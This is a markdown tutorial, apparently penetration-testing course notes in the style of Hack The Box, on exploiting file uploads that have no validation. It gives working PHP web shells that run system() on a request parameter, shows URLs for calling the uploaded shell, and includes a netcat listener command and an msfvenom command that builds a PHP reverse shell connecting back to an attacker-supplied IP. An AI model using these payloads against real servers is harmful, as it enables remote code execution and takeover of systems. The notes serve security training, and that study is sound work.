````markdown
# File Upload Attacks - Basic Exploitation

## 🚨 Absent Validation

This is the most critical and easiest file upload vulnerability to exploit.

If there is no validation → any file can be uploaded → full server compromise

---

## 🔓 What Does It Mean?

The application does not validate:

- File extension  
- File content  
- MIME type  
- Any upload restrictions  

➡️ Result: Arbitrary File Upload

---

## ⚙️ Attack Flow

### 1. Upload a Malicious File

Example:

```php
<?php echo "Hello HTB"; ?>
````

Or a web shell:

```php
<?php system($_GET['cmd']); ?>
```

---

### 2. File is Stored Without Restrictions

Example path:

/uploads/shell.php

---

### 3. Access the File

[http://SERVER/uploads/shell.php](http://SERVER/uploads/shell.php)

---

### 4. Code Execution

If you see output:

Hello HTB

➡️ Code execution confirmed (RCE)

---

## 🧠 Identify Backend Technology

Before uploading payloads, identify the backend language.

### Methods:

* Try extensions:

  * /index.php
  * /index.asp
  * /index.aspx

* Use tools like Wappalyzer

* Analyze:

  * HTTP headers
  * Cookies
  * URL structure

---

## ⚠️ Indicators of Vulnerability

* “All Files” allowed
* .php upload works
* No validation errors
* File executes after upload

➡️ Likely no validation at all

---

## 💥 Impact

* Remote command execution
* Full system access
* Data exfiltration
* Lateral movement

---

## 🧩 Key Idea

If you can upload an executable file
And you can access it

➡️ You control the server

---

## 🚀 Upload Exploitation

Once upload is possible, the goal is to gain control of the system.

---

## 🐚 Web Shell

A web shell allows command execution via browser.

### Simple Web Shell

```php
<?php system($_REQUEST['cmd']); ?>
```

### Usage:

[http://SERVER/uploads/shell.php?cmd=id](http://SERVER/uploads/shell.php?cmd=id)

Example output:

uid=33(www-data)

---

### Using Existing Shells

* phpbash
* SecLists Web-Shells

---

## 🔄 Reverse Shell

More powerful than a web shell.

✔ Interactive access
✔ Better for post-exploitation
✔ Enables pivoting

---

### Step 1: Prepare Payload

```php
$ip = 'YOUR_IP';
$port = YOUR_PORT;
```

---

### Step 2: Start Listener

```bash
nc -lvnp 4444
```

---

### Step 3: Execute Payload

[http://SERVER/uploads/reverse.php](http://SERVER/uploads/reverse.php)

---

### Result

connect to YOUR_IP
uid=33(www-data)

➡️ Shell access obtained

---

## ⚙️ Generate Reverse Shell (msfvenom)

```bash
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw > reverse.php
```

---

## 🧠 Web Shell vs Reverse Shell

| Type          | Pros                  | Cons                  |
| ------------- | --------------------- | --------------------- |
| Web Shell     | Simple, reliable      | Limited functionality |
| Reverse Shell | Interactive, powerful | May be blocked        |

---

## ⚠️ Common Issues

* system() disabled
* Firewall blocking outbound traffic
* WAF detection
* Permission restrictions

➡️ Alternatives:

* LFI
* Log poisoning
* Different payloads

---

## 🔥 Summary

Upload without validation → upload web shell → execute commands

If possible → reverse shell → full system control

---

## 🧠 Pentester Mindset

1. Can I execute code?
2. Can I get a shell?
3. Can I escalate privileges?

```
